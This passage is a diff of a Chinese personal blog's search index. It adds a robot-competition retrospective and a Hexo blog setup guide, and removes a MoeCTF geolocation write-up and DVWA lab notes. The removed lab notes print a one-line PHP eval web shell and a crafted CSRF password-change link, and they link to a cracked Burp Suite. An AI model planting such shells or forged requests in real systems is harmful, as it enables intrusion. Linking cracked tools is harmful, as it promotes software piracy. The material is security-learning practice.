class="number">1</span>], <span class="number">0</span>, img_h))</span><br><span class="line"></span><br><span class="line">            radius = <span class="built_in">int</span>(Misc.<span class="built_in">map</span>(radius, <span class="number">0</span>, size[<span class="number">0</span>], <span class="number">0</span>, img_w))  </span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>根据预设代码的研究发现，如果直接对图像进行分割，它可能会导致对最大图像的识别的误差，即在切割之后的图像可能不是识别到的最大的轮廓，如果在收集并处理过图像之后，对图像的腐蚀膨胀操作可能无法使图像正常识别，猜测因为图像经腐蚀膨胀后两边图像的差异化不够明显。故方案作废。</p>
+<p>而后我通过在幻尔科技的官方网站上进行查阅资料，发现在介绍中有着“标签识别”的功能。于是我预想通过重定义标签或是对预设标签进行替换，即将两边箭头的图像编辑成“标签”，通过对新“标签”的识别做出反应，从而达到方向识别的效果。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">detector = apriltag.Detector(searchpath=apriltag._get_demo_searchpath())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">apriltagDetect</span>(<span class="params">img</span>):  </span><br><span class="line"></span><br><span class="line">    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</span><br><span class="line"></span><br><span class="line">    detections = detector.detect(gray, return_image=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(detections) != <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> detection <span class="keyword">in</span> detections:              </span><br><span class="line"></span><br><span class="line">            corners = np.rint(detection.corners)  <span class="comment"># 获取四个角点</span></span><br><span class="line"></span><br><span class="line">            cv2.drawContours(img, [np.array(corners, np.<span class="built_in">int</span>)], -<span class="number">1</span>, (<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            tag_family = <span class="built_in">str</span>(detection.tag_family, encoding=<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 获取tag_family</span></span><br><span class="line"></span><br><span class="line">            tag_id = <span class="built_in">int</span>(detection.tag_id)  <span class="comment"># 获取tag_id</span></span><br><span class="line"></span><br><span class="line">            object_center_x, object_center_y = <span class="built_in">int</span>(detection.center[<span class="number">0</span>]), <span class="built_in">int</span>(detection.center[<span class="number">1</span>])  <span class="comment"># 中心点</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">tag_family, tag_id = apriltagDetect(img) <span class="comment"># apriltag检测</span></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tag_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">        cv2.putText(img, <span class="string">&quot;tag_id: &quot;</span> + <span class="built_in">str</span>(tag_id), (<span class="number">10</span>, img.shape[<span class="number">0</span>] - <span class="number">30</span>), cv2.FONT_HERSHEY_SIMPLEX, <span class="number">0.65</span>, [<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        cv2.putText(img, <span class="string">&quot;tag_family: &quot;</span> + tag_family, (<span class="number">10</span>, img.shape[<span class="number">0</span>] - <span class="number">10</span>), cv2.FONT_HERSHEY_SIMPLEX, <span class="number">0.65</span>, [<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        cv2.putText(img, <span class="string">&quot;tag_id: None&quot;</span>, (<span class="number">10</span>, img.shape[<span class="number">0</span>] - <span class="number">30</span>), cv2.FONT_HERSHEY_SIMPLEX, <span class="number">0.65</span>, [<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        cv2.putText(img, <span class="string">&quot;tag_family: None&quot;</span>, (<span class="number">10</span>, img.shape[<span class="number">0</span>] - <span class="number">10</span>), cv2.FONT_HERSHEY_SIMPLEX, <span class="number">0.65</span>, [<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>经过对代码和机器人内部文件的查阅，我发现机器人的标签识别功能是建立在四个脚点的定位上，不具备对箭头等不规则图形的识别功能，同时机器人内部不存在标签相关的图像文件，难以对标签识别的代码与文件进行修改。故方案作废。</p>
+<p>然后我看到了面部识别的功能介绍和代码，我计划通过修改面部识别的文件，将“箭头”作为“面部”进行识别，但经对面部识别代码以及机器人内部文件的研究，发现机器人的面部识别功能是基于.d6a模型建立起来的。无法针对已经完善的模型文件进行修改，剩余的时间也不足以训练一个新的模型，故方案作废。</p>
+<p>至此，无论是剩余的时间还是任务分配都不允许我去设计其他新的思路去比赛，最终迫不得已基于思路一穷举出了可能的箭头情况并在比赛中分别调用，尽管我们及时发现并修补了机器人行动程序上的缺陷，但场地摩擦力不均带来的行动困难、机器人腿部舵机问题引起的不可控因素等场外条件将比赛算法不成熟引起的问题放大到了极致。因此很遗憾没有取得一个令人满意的成绩。</p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>复盘</tag>
       </tags>
   </entry>
   <entry>
@@ -494,198 +461,231 @@
       </tags>
   </entry>
   <entry>
-    <title>MoeCTF2023部分题目wp</title>
-    <url>/2023/09/20/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/</url>
-    <content><![CDATA[<p>比赛链接：<a href="https://ctf.xidian.edu.cn/">https://ctf.xidian.edu.cn/</a></p>
-<p>因为本人水平有限，并且部分题目是一边做一边记录，有错误在所难免，还请各位师傅多多批评指正。</p>
-<span id="more"></span>
-
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><details>
-
-<summary>http</summary>
-
-<p>使用工具：Burp</p>
-</details>
-
-<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><details>
-
-<summary>机位查询</summary>
-
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695552040696.png"></p>
-<p>使用工具：百度地图，高德地图；(exif)</p>
-<p>题干的安装包里有三个文件（1、2、3）。</p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695546103340.png"></p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695546153083.png"></p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695546160885.png"></p>
-<p>P1可以看到图片中有个很明显的南宁站，结合旁边的”高铁商务酒店”可以初步判断P1地址位于南宁高铁站附近</p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695546843704.png"></p>
-<p>然后根据地图与照片尝试反推位置：机位既能看到”猪霸王”所在的美食街，又能看到城市便捷酒店的远角以及南宁站的全貌。因此可以做一个大致的视线图如下。</p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695547408548.png"></p>
-<p>模拟图显示机位大概在”摩根快捷酒店”与”运德集团小区”附近，考虑到简易标点的误差，把”君安快捷酒店”作为备选项，选择用百度实景地图查看一下附近的具体信息。<img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695547590711.png"></p>
-<p>很显然，只有”嘉士摩根国际”这个建筑具备机位的相关条件，”运德集团小区”的建筑高度无法实现该效果，如果采取相同角度在”君安快捷酒店”拍照，”嘉士摩根国际”必然会出现在照片中。因此P1的flag片段为”jiashi”（注意平翘舌，别问我为什么）。</p>
-<p>P2有一个很明显的”中山路美食街”的特征，扔到bing搜索一下。<img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695548004807.png"></p>
-<p>又在南宁，顺手看一眼图片。</p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695548056397.png"></p>
-<p>看到一个类似的图片，点进去发现是素材库。判断这个图片可能是网图，开始百度识图。<img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695548274601.png"></p>
-<p>发现是某摄影比赛的作品，于是<del>找到主办方联系作者发邮件问照片是在哪拍的，</del> 打开百度地图搜索南宁中山路美食街</p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695548713876.png"></p>
-<p>根据”琉璃净”的位置确认具体方位。然后根据照片推断大致机位位置。（这里吐槽一下百度地图和高德地图一个不支持地图旋转，一个没有实景地图）</p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695548962411.png"></p>
-<p>根据上面比赛信息，可以排除在马路上使用无人机进行拍摄，所以只能是在”广西高等法院办公楼旧址”所在的区域，利用百度实景地图瞄一眼。</p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695549111309.png"></p>
-<p>显然，P2的flag片段为：baisheng</p>
-<p>P3比较麻烦，整个照片几乎没有有效的特征信息，只有最远处高楼有”广西农信”的字样，因此我猜测照片还是在南宁，在百度地图上尝试搜索”时代丽都”。</p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695549302124.png"></p>
-<p>运气很好。并且根据近大远小的透视关系。以及”时代丽都”和”中国人保大厦”的相对位置，可以很容易判断照片是从左往右拍摄的。照片下方有一串95500的电话，经过查询是太平洋保险的电话，由此向左寻找和太平洋相关的地标。</p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695549579432.png"></p>
-<p>初步判断是左边的”疫苗临床研究所”，查询全景地图。</p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695549812014.png"></p>
-<p>显然右边的黄色建筑（疾病预防控制中心）的高度不足以越过”太平洋世纪广场”所在的楼，所以还需要再重新定位。</p>
-<p>再往左看，发现最近同时具备能拍摄”太平洋世纪广场”并且高度明显远高于”太平洋世纪广场”的建筑仅可能有”铭湖经典”、”东方明珠花园”和”汇金苑”</p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695550053013.png"></p>
-<p>此时我发现了”中国人保”右边的字被挡住了，因此在通过实景地图查询中国人保标牌在建筑上的相对位置可以模拟一条较为精确的视线。</p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695550372881.png"></p>
-<p>大致为2&#x2F;3的位置。同时根据机位大概在”时代丽都”与”中国人保财险”的位置正中，并且”时代丽都”所在的区域背后有一条视角偏左的马路，可以模拟另一条视线图。同时照片是刚好只能看到”太平洋世纪广场”的电话的，所以可以做第三条视线图。</p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695551035234.png"></p>
-<p>受限于误差，仅仅排除了”铭湖经典”。并且不能判断究竟是”东方明珠花园”的前楼还是”东方明珠花园”与”汇金苑”的侧楼，然后我又仔细观察了一遍照片，发现有一个红色标识的楼位于机位的正中央。</p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695551258300.png"></p>
-<p>区域特征是旁边有一些红色的楼群，并且几乎都是高度较高的建筑，以及一个红色的不明logo，利用卫星地图确认了目标楼，并作了视线图，由于位于照片正中央，因此只需作平行线即可。</p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695551520367.png"></p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695551566402.png"></p>
-<p>然后再通过实景地图确认，”东方明珠花园”前楼的高度不足，因此P3的flag片段为”huijin”。</p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695551701456.png"></p>
-<p>最后，关于P3的这些各位读者其实都可以不看，因为我直到整理wp的时候才想起来把照片扔exif里查一下，里面写了经纬度……</p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695551823956.png"></p>
-<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695551866254.png"></p>
-<p>哭了，我的头发，我对不起你。</p>
-</details>
-]]></content>
-      <tags>
-        <tag>复盘</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DVWA靶场练习笔记</title>
-    <url>/2023/11/01/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<p>发现了一个很棒的靶场，里面囊括了Web方向的大多数常见漏洞，并且还分了四个难度等级（Low,Medium,High,Impossible），很适合目前我的需求。</p>
-<span id="more"></span>
-
-<p>TODO:</p>
+    <title>利用hexo在github上搭建个人博客</title>
+    <url>/2023/08/15/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<p>由于厚米的服务器过期了，不好意思找他续费，于是决定自己搭一个blog，国内的要么广告多（X书），要么后台略显老旧（X园），几经挑选之后决定利用hexo在github上搭建。</p>
+<p>搭建的过程基本参考了<a href="https://www.cnblogs.com/huanhao/p/hexobase.html#%E9%85%8D%E7%BD%AE%E4%B8%BB%E9%A2%98">【基础篇】hexo博客搭建教程</a>。<br>但是可能是由于版本更新的问题，遇到了一些意料之外的情况。</p>
+<p>同时基于原本的教程增加了一些新功能并作此记录。</p>
 <ul>
-<li><input disabled="" type="checkbox"> Low</li>
-<li><input disabled="" type="checkbox"> Medium</li>
-<li><input disabled="" type="checkbox"> High</li>
-<li><input disabled="" type="checkbox"> Impossible</li>
+<li><input checked="" disabled="" type="checkbox"> 2023&#x2F;12&#x2F;1：记录了添加谷歌日历订阅的简易过程</li>
+<li><input checked="" disabled="" type="checkbox"> 2024&#x2F;4&#x2F;30 :  记录了修正hexo new生成页面需要手动修改类型(categorie -&gt; categories)的问题</li>
 </ul>
-<details>
+<span id="more"></span>
 
-<summary>Brute Force(暴力破解)</summary>
+<h2 id="问题汇总"><a href="#问题汇总" class="headerlink" title="问题汇总"></a>问题汇总</h2><ol>
+<li>在git bash中执行安装cnpm出错<br>错误1：Error: EPERM: operation not permitted<br>解决方案：利用管理员模式打开git即可。<br>错误2：ERR! code EPERM<br>解决方案：将C:&#x2F;user&#x2F;用户名&#x2F;.npmrc删除（需要打开隐藏文件）。</li>
+<li>上传github时页面主题未显示<br>解决方案：分别在博客页面所在的文件夹执行hexo clean后再执行hexo g -d与 hexo d。（无法确认究竟是什么导致的问题，推测是缓存问题。）</li>
+<li>修改schemes后上传无效<br>删除themes&#x2F;next 中的.git（隐藏），再重新执行hexo g -d与 hexo d即可.</li>
+</ol>
+<p>另：由于github的项目规则更改，如果按照链接中的教程会将页面信息上传到项目的master分支中，此时只需将（根目录下的）页面配置文件中的branch项改成main即可。</p>
+<ol start="4">
+<li><p>图片插入无法显示</p>
+<p>图片根目录位于 &#x2F;博客名称&#x2F;themes&#x2F;主题名&#x2F;source&#x2F;images。即如果需要插入图片，需要引用的代码格式为 :<code>！[](./images/图片名(或者可以加入二级文件夹) ))</code></p>
+<p>可以用hexo s在本地页面中检查是否成功，同时本地页面可以动态调整。</p>
+</li>
+<li><p>新版hexo下文章创建无法分段</p>
+<p>需要在文章正文需要分段的地方自行添加 <code>&lt;!--more--&gt;</code></p>
+</li>
+</ol>
+<h2 id="增加谷歌日历订阅"><a href="#增加谷歌日历订阅" class="headerlink" title="增加谷歌日历订阅"></a>增加谷歌日历订阅</h2><details>
+<summary>展开</summary>
 
-<details>
-
-<summary>Low</summary>
-
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698826342694.png" alt="1698826342694"></p>
-<p>先随意选择一组用户名和密码看看会发生什么。</p>
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698827316880.png" alt="1698827316880"></p>
-<p>显示用户名和&#x2F;或密码错误，除此之外没有任何的机制。所以考虑使用Burp的Intruder模块对用户名和密码进行爆破。</p>
-<p>这里由于username和password都需要爆破。所以考虑Pitchfork模块或者Cluster Bomb模块（Sniper和Batteringram只能导入一个payload），这里选择Clusterbomb。</p>
-<p>选择字典之后开始爆破。</p>
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698831896134.png" alt="1698831896134"></p>
-<p>发现了一个长度明显有差异的返回长度。输入进去。</p>
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698831967463.png" alt="1698831967463"></p>
+<p>（以信息来源：<a href="https://www.ctfhub.com/#/calendar">CTFHub calendar</a>为例）</p>
+<ol>
+<li><p>打开主题内的_config.yml,找到calendar备用（\themes\next_config.yml）。<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701415622456.png" alt="1701415622456"></p>
+</li>
+<li><p>打开谷歌开发控制板 <code>https://console.cloud.google.com/apis/dashboard</code> ，创建一个新项目（名字随意，位置默认）。<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701416010725.png" alt="1701416010725"></p>
+</li>
+<li><p>在上方搜索框中搜索：Google calendar api.选择并启用。<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701415764731.png" alt="1701415764731"></p>
+</li>
+<li><p>打开OAuth consent screen，名称随意，User type选外部，邮箱填写自己的即可，范围勾选所有的Google calendar api。测试用户不用管，然后继续<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701416611080.png" alt="1701416611080"></p>
+</li>
+<li><p>打开凭据，选择创建凭据-api密钥，复制生成的密钥到_config.yml中的api_key里。<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701416630608.png" alt="1701416630608"><br>5.5. 如果有需要可以在api设置中add自己的网站为过滤条件，可以防止api被恶意使用（可选）<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701417104331.png" alt="1701417104331"></p>
+</li>
+<li><p>打开谷歌日历，打开设置-添加日历-通过网址添加<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701417220508.png" alt="1701417220508"></p>
+</li>
+<li><p>打开刚才添加的日历，找到集成日历，复制集成日历的日历ID。（如果添加的是自己的日历需要将日历设置为公开）<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701417310583.png" alt="1701417310583"></p>
+</li>
+<li><p>将日历id填入_config.yml。</p>
+<p><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1714357303411.png" alt="1714357303411"></p>
+</li>
+<li><p>在网站根目录用命令 <code>hexo new page schedule</code>创建日程表页面。</p>
+</li>
+<li><p>修改刚刚创建的页面，添加 <code>type: scheldule</code>，可自定义修改名字。<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701417519112.png" alt="1701417519112"></p>
+</li>
+<li><p>启用menu中的schedule。<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701417720304.png" alt="1701417720304"></p>
+</li>
+<li><p>hexo s 在本地查看无误后分别执行 <code>hexo clean</code>和 <code>hexo g -d</code>推送。</p>
+</li>
+</ol>
 </details>
 
-</details>
+<h2 id="修正hexo-new生成页面需要手动修改类型-categorie-categories-的问题"><a href="#修正hexo-new生成页面需要手动修改类型-categorie-categories-的问题" class="headerlink" title="修正hexo new生成页面需要手动修改类型(categorie -&gt; categories)的问题"></a>修正hexo new生成页面需要手动修改类型(categorie -&gt; categories)的问题</h2><details>
+<summary>展开</summary>
 
-<hr>
-<details>
-<summary>Command Injection(指令注入)</summary>
-<details>
-<summary>Low</summary>
-
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698843230447.png" alt="1698843230447"><br><del>（是知识盲区</del>  尝试着分析了一下，工作原理可能是直接将输入框内的文字与ping命令进行拼接。</p>
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698843498673.png" alt="1698843498673"></p>
-<p>并且不能过滤不合法的输入，那么尝试一下用&amp;符号进行注入。<del>（windows命令行指令都是啥来着</del></p>
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698843906106.png" alt="1698843906106"></p>
-</details>
-</details>
-
-<hr>
-<details>
-<summary>CSRF(Cross Site Request Forgery)(跨站请求伪造)</summary>
-<details>
-<summary>Low</summary>
-
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698844012937.png" alt="1698844012937"></p>
-<p>尝试抓个包。</p>
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698845752819.png" alt="1698845752819"></p>
-<p>发现是直接传递了新的密码和确认的密码，同时查看源代码发现是直接判断New password和Conf password是否相等，并没有其他的验证。</p>
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1700221775155.png" alt="1700221775155"></p>
-<p><del>普通版burp不具备生成CSRF poc的功能，换个工具先（</del>    burp汉化破解链接 <code>https://www.52pojie.cn/thread-1544866-1-1.html</code></p>
-<p>或者不使用poc工具，直接构造链接 <code>http://127.0.0.1/DVWA-2.3/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</code> 即可 ，或者再用短链接生成器包装一下看着像那么回事也可以。</p>
-</details>
-</details>
-
-<hr>
-<details>
-<summary>File Inclusion(文件包含)</summary>
-<details>
-
-<summary>Low</summary>
-
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698849299946.png" alt="1698849299946"></p>
-<p>页面上给了三个php文件，逐个点击后没有发现特别有用的信息。</p>
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698849364929.png" alt="1698849364929"></p>
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698849376545.png" alt="1698849376545"><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698849392702.png" alt="1698849392702"></p>
-<p>然后注意到了浏览器的网址栏，发现所谓php文件的读取是直接将php文件传入page中再读出来，联系到标题的文件隐藏，尝试着将page&#x3D;file3.php改成page&#x3D;file4.php。</p>
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698849666992.png" alt="1698849666992"></p>
-</details>
-</details>
-
-<hr>
-<details>
-<summary>File Upload(文件上传漏洞)</summary>
-<details>
-<summary>Low</summary>
-
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1700222526114.png" alt="1700222526114"></p>
-<p>虽然说是上传图片，但是源代码中没有对上传文件的格式作要求</p>
-<p>一句话木马干就完了 <code>&lt;?php @eval($_POST[&#39;z&#39;]);?&gt;</code></p>
-<p><del>tmd卡巴斯基怎么又给我的文件清理了</del></p>
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1700466093449.png" alt="1700466093449"></p>
-<p>上传成功，可以看到下面回显了路径，然后用蚁剑连接或者拼接路径也可以</p>
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1700466460394.png" alt="1700466460394"></p>
-<p>成功（记得把php文件删掉</p>
-</details>
-</details>
-
-<hr>
-<details>
-<summary>Insecure CAPTCHA(不安全验证码)</summary>
-
-<p><strong>因配置验证码的key有问题，所以暂时搁置</strong></p>
-</details>
-
-<hr>
-<details>
-
-<summary>SQL Injection(SQL注入)</summary>
-
-<details>
-<summary>Low</summary>
-
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1700468784744.png" alt="1700468784744"></p>
-<blockquote>
-<p>SQL注入的第一步就要判断注入类型。一般来说，SQL注入按照<strong>参数分类</strong>分为：<strong>字符型</strong>和<strong>数字型</strong>，按照<strong>页面回显</strong>分为<strong>回显注入</strong>和<strong>盲注</strong>，<strong>回显</strong>分为<strong>回显正常</strong>和<strong>回显报错</strong>，<strong>盲注</strong>分为<strong>时间盲注</strong>和<strong>布尔盲注</strong>。</p>
-<p><a href="https://eklos9z.github.io/2023/10/22/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more">漏洞挖掘学习笔记 | Eklos&#39;s Blog (eklos9z.github.io)</a></p>
-</blockquote>
-<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1700541103208.png" alt="1700541103208"></p>
-</details>
+<p>不确定是我个人的问题，还是hexo的普遍问题，此问题曾导致：使用 <code>hexo new</code>生成页面时，默认生成的页面里categories拼写错误，需要手动修改。<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1714442743740.png" alt="1714442743740"><br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1714442805573.png" alt="1714442805573"><br>解决方案：进入 <code>.\%BLOG_NAME%\scaffolds</code>里修改自己使用的页面默认格式。<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1714443016916.png" alt="1714443016916"><br>如果不确定自己使用的哪个页面，前往根目录的 <code>_config.yaml</code>里的 <code>default_layout</code>列查看</p>
+<p><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1714443180903.png" alt="1714443180903"></p>
 </details>
 ]]></content>
       <categories>
-        <category>信息安全</category>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>自学</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>buuctf刷题记录</title>
+    <url>/2024/04/30/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>未来怎么又可期了</p>
+<span id="more"></span>
+
+<details>
+<summary>Web</summary>
+
+<details>
+<summary>[极客大挑战 2019]EasySQL</summary>
+
+<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714459494749.png" alt="1714459494749"></p>
